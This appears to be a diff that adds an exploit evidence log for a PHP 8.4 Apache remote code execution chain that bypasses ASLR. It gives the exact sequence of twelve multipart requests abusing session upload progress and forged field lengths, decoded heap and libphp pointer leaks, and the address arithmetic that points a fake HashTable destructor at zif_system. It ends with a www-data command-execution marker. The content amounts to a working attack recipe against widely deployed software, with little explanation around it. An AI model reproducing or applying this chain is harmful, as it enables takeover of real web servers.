@@ -1,0 +1,61 @@
+9bie php2shell-bypass-aslr-exp - exact request sequence and leak evidence
+Official php:8.4.26-apache (digest php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a)
+Single-worker prefork, display_errors=On, memory_limit=8M, max_input_vars=1000, ASLR=2
+
+seq phase            body parts    resp workers before         after                  cookie
+  1 rotate A     15657436  1005     693 257                    257                    -
+  2 rotate B          192     2       0 257                    257                    -
+  3 stage1 A     12655437  1005     693 []                     304                    -
+  4 stage1 B        93685   844   12227 304                    304                    4096B/98ptr
+  5 rotate A     15657436  1005     693 304                    304                    -
+  6 rotate B          192     2       0 304                    []                     -
+  7 stage2 A     12693475  1005     693 []                     370                    -
+  8 stage2 B        83032  1000     857 370                    370                    16B/0ptr
+  9 rotate A     15657436  1005     693 370                    370                    -
+ 10 rotate B          192     2       0 370                    []                     -
+ 11 stage3 A     12584151    10     367 []                     435                    -
+ 12 stage3 B         4278    20       0 435                    435                    -
+
+Notable request shapes (names/sizes; full part list in requests.json):
+  #1  rotate A   1005 parts; PHPSESSID=1B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B
+  #2  rotate B   2 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B
+  #3  stage1 A   1005 parts; PHPSESSID=1B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B
+  #4  stage1 B   844 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B, 841 fields 1000..1840 (48B) + forged 1999 (79B, len=0x1000)
+  #5  rotate A   1005 parts; PHPSESSID=1B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B
+  #6  rotate B   2 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B
+  #7  stage2 A   1005 parts; PHPSESSID=1B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B
+  #8  stage2 B   1000 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B, 983 array fields; a0406 has 16 elems (16B each)
+  #9  rotate A   1005 parts; PHPSESSID=1B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B
+  #10 rotate B   2 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B
+  #11 stage3 A   10 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B, file=a.txt/64B, big=12582912B, hdr={'Cookie': 'PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}, 6 pads name31/value31 + PHPSESSID 19B
+  #12 stage3 B   20 parts; PHPSESSID=19B, PHP_SESSION_UPLOAD_PROGRESS=3B, 2x15B filler + 15B carrier + 15x167B fake HT
+
+Stage 1 decode (resp_04.raw):
+  Set-Cookie decoded length: 4096 bytes
+  heap pointers (0x7f.... range): 98
+  2MB-aligned modes: [['0x7f1838000000', 98]]
+  first pointers: [{'off': 56, 'val': '0x7f18380a70a0'}, {'off': 104, 'val': '0x7f18380a70c0'}, {'off': 136, 'val': '0x7f18380a70f0'}, {'off': 168, 'val': '0x7f18380a7100'}]
+  decoded head hex: 4c4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141
+  => chunk base = 0x7f1838000000 (98/98 pointers agree)
+
+Stage 2 decode (resp_08.raw):
+  Set-Cookie decoded length: 16 bytes
+  bytes[0:8]  = 0x10  (HashTable nTableSize = 16)
+  bytes[8:16] = 0x7f183a28db60  (pDestructor = libphp + 0x65eb60)
+  low12 check: True (0xb60)
+  implied libphp base = 0x7f1839c2f000
+
+Stage 3 address arithmetic (same run):
+  chunk base            = 0x7f1838000000
+  HTDATA = chunk+0x690d8= 0x7f18380690d8 (live 167-byte zend_string carrier)
+  libphp base           = 0x7f1839c2f000
+  ZIF    = libphp+0x465370 = 0x7f183a094370 (zif_system)
+  DTOR   = libphp+0x65eb60 = 0x7f183a28db60 (ZVAL_PTR_DTOR, leak anchor)
+  trigger: php_session_track_init -> zval_ptr_dtor(PS(http_session_vars)) ->
+           zend_reference_destroy -> zend_array_destroy(fake HT) ->
+           zend_hash_destroy -> pDestructor(&bucket->val) == zif_system
+
+Worker rotation evidence: each rotate B (seq 2/6/10) returns 0 bytes; the child
+disappears and prefork forks a new PID for the next stage (e.g. 304 -> 370 -> 435).
+
+Final marker (fresh /out/sw1..3): uid=33(www-data) gid=33(www-data) groups=33(www-data)
